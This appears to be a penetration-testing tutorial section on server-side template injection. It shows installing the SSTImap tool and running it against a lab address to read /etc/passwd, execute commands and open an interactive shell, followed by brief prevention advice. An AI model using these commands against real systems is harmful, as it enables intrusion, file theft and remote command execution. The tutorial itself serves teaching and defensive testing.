# SSTI Tools of the Trade & Preventing SSTI

This section covers tools for identifying and exploiting SSTI vulnerabilities, plus prevention strategies.

## Tools of the Trade

**SSTImap** is the modern alternative to the deprecated tplmap. Installation and setup:

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
```

### Identifying SSTI Vulnerabilities

Run SSTImap against your target URL:

```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

**Output example:**
- Query parameter: `name`
- Engine: `Twig`
- Capabilities: Shell execution, file read/write, code evaluation

### Exploitation Techniques

**Download remote files:**
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```

**Execute system commands:**
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

**Interactive shell:**
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

## Prevention

- **Never pass user input directly to template rendering functions**
- Review all code paths handling user input and templates
- For custom templates: implement engine hardening by removing dangerous functions
- **Best practice**: isolate template execution in separate environments (e.g., Docker containers)
